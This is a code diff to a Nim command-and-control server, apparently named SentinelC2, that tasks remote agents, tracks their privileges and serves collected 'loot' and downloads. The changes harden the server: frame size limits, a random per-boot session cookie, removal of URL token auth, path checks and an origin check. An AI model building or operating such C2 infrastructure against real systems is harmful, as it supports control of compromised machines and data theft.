@@ -379,6 +379,8 @@ proc sendWsFrame(sock: AsyncSocket, data: seq[byte]) {.async.} =
   frame.add(data)
   await sock.send(cast[string](frame))
 
+const MAX_WS_FRAME_BYTES = 64 * 1024 * 1024
+
 proc recvWsFrame(sock: AsyncSocket): Future[seq[byte]] {.async.} =
   var hdr: array[2, byte]
   let n1 = await sock.recvInto(addr hdr[0], 2)
@@ -395,8 +397,15 @@ proc recvWsFrame(sock: AsyncSocket): Future[seq[byte]] {.async.} =
     var ext: array[8, byte]
     let n3 = await sock.recvInto(addr ext[0], 8)
     if n3 != 8: return @[]
+    # Refuse anything >= 2^56 before the shift arithmetic can wrap
+    # the sign bit — attacker-supplied lengths must never drive
+    # allocation sizing.
+    if ext[0] != 0:
+      return @[]
     L = 0
-    for i in 0..<8: L = (L shl 8) or int(ext[i])
+    for i in 1..<8: L = (L shl 8) or int(ext[i])
+  if L < 0 or L > MAX_WS_FRAME_BYTES:
+    return @[]
   var mask: array[4, byte]
   if masked:
     let n4 = await sock.recvInto(addr mask[0], 4)
@@ -422,6 +431,7 @@ proc wsUpgrade(client: AsyncSocket): Future[bool] {.async.} =
     let n = await client.recvInto(addr ch[0], 1)
     if n != 1: return false
     buf.add(char(ch[0]))
+    if buf.len > 8192: return false
     if buf.endsWith("\r\n\r\n"): break
   var key = ""
   for line in buf.split("\r\n")[1..^1]:
@@ -571,31 +581,34 @@ proc handleAgent(client: AsyncSocket) {.async.} =
             session.username & " (" & session.privileges & ")")
 
     proc sender() {.async.} =
+      # Single-owner dequeue loop. The previous design asyncCheck'd a
+      # poll task per 15s idle cycle; those tasks were never cancelled
+      # and each zombie stole the next queued command into a dead
+      # future. One loop, one deadline, no stragglers.
+      var deadline = now() + initDuration(seconds = 15)
       while true:
-        let fut = newFuture[JsonNode]("dequeue")
-        proc poll() {.async.} =
-          while true:
-            let x = session.cmdQueue
-            if x.len > 0:
+        var cmd: JsonNode = nil
+        {.cast(gcsafe).}:
+          withLock agentsLock:
+            if session.cmdQueue.len > 0:
+              cmd = session.cmdQueue[0]
               session.cmdQueue.delete(0)
-              fut.complete(x[0])
-              return
-            await sleepAsync(50)
-        asyncCheck poll()
-        let ok = await withTimeout(fut, 15000)
-        if ok:
-          let cmd = fut.read
+        if cmd != nil:
           try:
             await client.sendWsFrame(encryptFrame(session, $cmd))
             session.lastBeacon = now()
             logLine(session.id, "[>] " & $cmd)
           except: break
-        else:
+          deadline = now() + initDuration(seconds = 15)
+        elif now() >= deadline:
           try:
             # Idle ping (encrypted with session key)
             await client.sendWsFrame(encryptFrame(session,
               $ %* {"cmd": "ping"}))
           except: break
+          deadline = now() + initDuration(seconds = 15)
+        else:
+          await sleepAsync(100)
 
     proc receiver() {.async.} =
       while true:
@@ -2004,7 +2017,16 @@ proc apiLoot(req: Request, agentId: string) {.async, gcsafe.} =
   await jsonResp(req, Http200, body)
 
 const WS_COOKIE_NAME = "sc2_sid"
-const WS_COOKIE_VALUE = "sentinel-dashboard-v1"
+
+# Per-boot random session token. Set in main() after randomize().
+# The static "sentinel-dashboard-v1" value was forgeable by anyone
+# who read the binary — a per-boot 256-bit token is not.
+var dashSessToken: string = ""
+
+proc newDashToken(): string =
+  var t: array[32, byte]
+  for i in 0..<32: t[i] = rand(255).byte
+  bytesToHex(t)
 
 proc checkAuth(req: Request): bool =
   # Validate Basic auth OR session cookie on every request. Cookie
@@ -2019,30 +2041,15 @@ proc checkAuth(req: Request): bool =
     if parts.len == 2 and parts[0] == WEB_AUTH_USER and parts[1] == WEB_AUTH_PASSWORD:
       return true
   let cookie = req.headers.getOrDefault("Cookie")
-  if WS_COOKIE_NAME & "=" & WS_COOKIE_VALUE in cookie:
-    return true
+  {.cast(gcsafe).}:
+    if dashSessToken.len > 0 and WS_COOKIE_NAME & "=" & dashSessToken in cookie:
+      return true
   return false
 
 proc requireAuth(req: Request) {.async, gcsafe.} =
   await req.respond(Http401, "unauthorized",
                     newHttpHeaders({"WWW-Authenticate": "Basic realm=\"SentinelC2\"",
                                     "Content-Type": "text/plain"}))
-
-# Validate a token supplied as ?token=<base64 of user:pass> in the URL.
-# (Fallback path — cookies are the primary WS auth mechanism.)
-
-
-proc checkAuthToken(query: string): bool =
-  for part in query.split('&'):
-    let kv = part.split('=', 1)
-    if kv.len == 2 and kv[0] == "token":
-      try:
-        let decoded = base64.decode(kv[1])
-        let parts = decoded.split(':', 1)
-        if parts.len == 2:
-          return parts[0] == WEB_AUTH_USER and parts[1] == WEB_AUTH_PASSWORD
-      except: discard
-  return false
 
 # WebSocket agents-list stream handler. Pushes a JSON list of agents
 # whenever the set changes (connect/disconnect). The dashboard uses
@@ -2096,9 +2103,11 @@ proc webHandler(req: Request) {.async, gcsafe.} =
   if m == HttpGet and url == "/":
     # Serve the dashboard and set the session cookie so the browser
     # can authenticate WebSocket upgrades (which can't send Basic auth).
+    var sessToken = ""
+    {.cast(gcsafe).}: sessToken = dashSessToken
     let hdrs = newHttpHeaders({
       "Content-Type": "text/html; charset=utf-8",
-      "Set-Cookie": WS_COOKIE_NAME & "=" & WS_COOKIE_VALUE &
+      "Set-Cookie": WS_COOKIE_NAME & "=" & sessToken &
                     "; Path=/; HttpOnly; SameSite=Lax"
     })
     await req.respond(Http200, DASHBOARD_HTML, hdrs)
@@ -2124,14 +2133,19 @@ proc webHandler(req: Request) {.async, gcsafe.} =
     await req.respond(Http404, "ws on port 8081")
     return
   if m == HttpGet and url.startsWith("/downloads/"):
-    # /downloads/<id>/<file>
+    # /downloads/<id>/<file> — both segments must be tight.
     let rest = url[11..^1]
     let slash = rest.find('/')
     if slash < 0:
       await req.respond(Http400, "bad path"); return
     let aid = rest[0..<slash]
-    let fname = rest[slash+1..^1]
-    if fname.contains("..") or fname.contains('\\') or fname.contains('/'):
+    # Agent ids are exactly 12 digits — anything else (incl. "..",
+    # empty, or encoded separators) is rejected before it can touch
+    # the path join.
+    if aid.len != 12 or not aid.allCharsInSet(Digits):
+      await req.respond(Http400, "bad agent"); return
+    let fname = rest[slash+1..^1].extractFilename
+    if fname.len == 0 or fname.contains(".."):
       await req.respond(Http400, "bad filename"); return
     let fpath = DOWNLOADS_DIR / aid / fname
     let ext = fname.splitFile.ext.toLowerAscii
@@ -2151,6 +2165,7 @@ proc webHandler(req: Request) {.async, gcsafe.} =
 # ------------------------------------------------------------
 proc main() {.async.} =
   randomize()
+  dashSessToken = newDashToken()
   initLock(agentsLock)
   initLock(agentSubsLock)
   initLock(logSubsLock)
@@ -2226,17 +2241,28 @@ proc main() {.async.} =
     let path = parts[1]
     var key = ""
     var cookie = ""
+    var origin = ""
+    var hostHdr = ""
     for line in lines[1..^1]:
       let kv = line.split(": ", 1)
       if kv.len == 2:
         if kv[0].toLowerAscii == "sec-websocket-key": key = kv[1]
         elif kv[0].toLowerAscii == "cookie": cookie = kv[1]
+        elif kv[0].toLowerAscii == "origin": origin = kv[1]
+        elif kv[0].toLowerAscii == "host": hostHdr = kv[1]
 
-    # Auth — cookie first, then ?token=... in the query
-    var authed = (WS_COOKIE_NAME & "=" & WS_COOKIE_VALUE in cookie)
-    if not authed and '?' in path:
-      let q = path.split('?', 1)[1]
-      authed = checkAuthToken(q)
+    # Auth — per-boot session cookie only. The old ?token= URL path
+    # leaked credentials into logs and is gone.
+    var authed = false
+    {.cast(gcsafe).}:
+      authed = (dashSessToken.len > 0 and
+                WS_COOKIE_NAME & "=" & dashSessToken in cookie)
+    if authed and origin.len > 0:
+      # Cross-site WebSocket hijack guard: only same-host origins.
+      let oHost = origin.split("://")[^1].split('/', 1)[0]
+      let hHost = hostHdr.split(':', 1)[0]
+      if oHost.toLowerAscii != hHost.toLowerAscii:
+        authed = false
     if not authed:
       try: await sock.send("HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n")
       except: discard
